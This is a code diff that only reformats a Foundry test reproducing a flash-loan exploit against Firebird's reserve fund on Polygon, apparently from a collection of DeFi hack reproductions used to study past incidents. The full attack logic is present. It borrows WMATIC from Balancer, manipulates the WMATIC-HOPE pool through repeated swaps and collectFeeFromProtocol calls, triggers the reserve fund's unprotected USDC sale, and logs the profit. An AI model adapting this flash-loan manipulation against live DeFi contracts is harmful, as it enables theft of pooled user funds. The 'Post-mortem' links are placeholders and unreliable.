@@ -10,12 +10,10 @@ import "./interface.sol";
 // Vulnerable Contract : https://polygonscan.com/address/0x5e9cd0861f927adeccfeb2c0124879b277dd66ac
 // Attack Tx : https://polygonscan.com/tx/0x96d80c609f7a39b45f2bb581c6ba23402c20c2b6cd528317692c31b8d3948328
 
-
 // @Analysis
 // Post-mortem : https://www.google.com/
 // Twitter Guy : https://www.google.com/
 // Hacking God : https://www.google.com/
-
 
 interface IFireBirdRouter {
     function swapExactTokensForTokens(
@@ -27,7 +25,7 @@ interface IFireBirdRouter {
         uint8[] memory dexIds,
         address to,
         uint256 deadline
-      ) external returns (uint256[] memory amounts);
+    ) external returns (uint256[] memory amounts);
 }
 
 interface IFirebirdReserveFund {
@@ -36,7 +34,7 @@ interface IFirebirdReserveFund {
 }
 
 interface IFireBirdPair {
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
 }
 
@@ -44,26 +42,20 @@ interface IHOPE is IERC20 {
     function transferFrom(address holder, address recipient, uint256 amount) external returns (bool);
 }
 
-
 interface IProxyUSDC is IUSDC {
-   function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 }
 
 contract ContractTest is Test {
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWETH WMATIC = IWETH(payable(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270));
-    IFireBirdRouter Router= IFireBirdRouter(0xb31D1B1eA48cE4Bf10ed697d44B747287E785Ad4);
+    IFireBirdRouter Router = IFireBirdRouter(0xb31D1B1eA48cE4Bf10ed697d44B747287E785Ad4);
     IFirebirdReserveFund ReserveFund = IFirebirdReserveFund(0x5D53C9F5017198333C625840306D7544516618e4);
     IFireBirdPair FLP = IFireBirdPair(0x5E9cd0861F927ADEccfEB2C0124879b277Dd66aC);
     IFireBirdPair ce2c_FBP = IFireBirdPair(0xCe2cB67b11ec0399E39AF20433927424f9033233);
     IProxyUSDC USDC = IProxyUSDC(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
     IHOPE HOPE = IHOPE(0xd78C475133731CD54daDCb430F7aAE4F03C1E660);
     uint256 amount = 286_000_000_000_000_000_000_000;
-
 
     function setUp() public {
         vm.createSelectFork("polygon", 48_149_138 - 1);
@@ -79,18 +71,18 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        uint startMATIC = WMATIC.balanceOf(address(this));
+        uint256 startMATIC = WMATIC.balanceOf(address(this));
         console.log("Before Start: %d MATIC", startMATIC);
 
         address[] memory tokens = new address[](1);
         tokens[0] = address(WMATIC);
-        uint[] memory amounts = new uint[](1);
+        uint256[] memory amounts = new uint[](1);
         amounts[0] = amount;
         bytes memory userData = "";
         Balancer.flashLoan(address(this), tokens, amounts, userData);
 
-        uint intRes =  WMATIC.balanceOf(address(this))/1 ether;
-        uint decRes =  WMATIC.balanceOf(address(this)) - intRes * 1e18;
+        uint256 intRes = WMATIC.balanceOf(address(this)) / 1 ether;
+        uint256 decRes = WMATIC.balanceOf(address(this)) - intRes * 1e18;
         console.log("Attack Exploit: %s.%s MATIC", intRes, decRes);
     }
 
@@ -100,18 +92,18 @@ contract ContractTest is Test {
         uint256[] memory feeAmounts,
         bytes memory userData
     ) external {
-        for(uint i=0; i<3; i++){
+        for (uint256 i = 0; i < 3; i++) {
             WMATIC_HOPE_PairSwap();
         }
         WMATIC.transfer(address(Balancer), amount);
     }
 
-    function WMATIC_HOPE_PairSwap() internal returns (uint){
-        uint amountIn = 226_000_000_000_000_000_000_000;
-        uint secAmount = routerSwap(address(WMATIC), address(USDC), amount - amountIn, 1, address(ce2c_FBP), 1); // swap WMATIC to USDC
-        for (uint i=0; i<3; i++){
+    function WMATIC_HOPE_PairSwap() internal returns (uint256) {
+        uint256 amountIn = 226_000_000_000_000_000_000_000;
+        uint256 secAmount = routerSwap(address(WMATIC), address(USDC), amount - amountIn, 1, address(ce2c_FBP), 1); // swap WMATIC to USDC
+        for (uint256 i = 0; i < 3; i++) {
             amountIn = routerSwap(address(WMATIC), address(HOPE), amountIn, 1, address(FLP), 1); // swap WMATIC to HOPE, deflate HOPE reserve in WMATIC-HOPE LP
-            ReserveFund.collectFeeFromProtocol();                                                // collect fee from protocol, burn WMATIC-HOPE LP, sent WMATIC to 'FirebirdReserveFund', a large amount of WMATIC-HOPE LP mint through manipulated mintLiquidityFee() function 
+            ReserveFund.collectFeeFromProtocol(); // collect fee from protocol, burn WMATIC-HOPE LP, sent WMATIC to 'FirebirdReserveFund', a large amount of WMATIC-HOPE LP mint through manipulated mintLiquidityFee() function
             amountIn = routerSwap(address(HOPE), address(WMATIC), amountIn, 1, address(FLP), 1); // swap HOPE to WMATIC back
         }
         ReserveFund.sellTokensToUsdc(); // 'FirebirdReserveFund' swap WMATIC to USDC without slippage protection
@@ -119,16 +111,23 @@ contract ContractTest is Test {
         return amountIn;
     }
 
-    function routerSwap(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOutMin, address path,
-        uint8 dexId) internal returns(uint256){
+    function routerSwap(
+        address tokenIn,
+        address tokenOut,
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address path,
+        uint8 dexId
+    ) internal returns (uint256) {
         address[] memory paths = new address[](1);
         paths[0] = path;
         uint8[] memory dexIds = new uint8[](1);
         dexIds[0] = dexId;
 
-        uint[] memory results = new uint[](2);
-        results = Router.swapExactTokensForTokens(tokenIn, tokenOut, amountIn, amountOutMin, paths, dexIds,
-            address(this), type(uint256).max);
+        uint256[] memory results = new uint[](2);
+        results = Router.swapExactTokensForTokens(
+            tokenIn, tokenOut, amountIn, amountOutMin, paths, dexIds, address(this), type(uint256).max
+        );
         return results[1];
     }
 
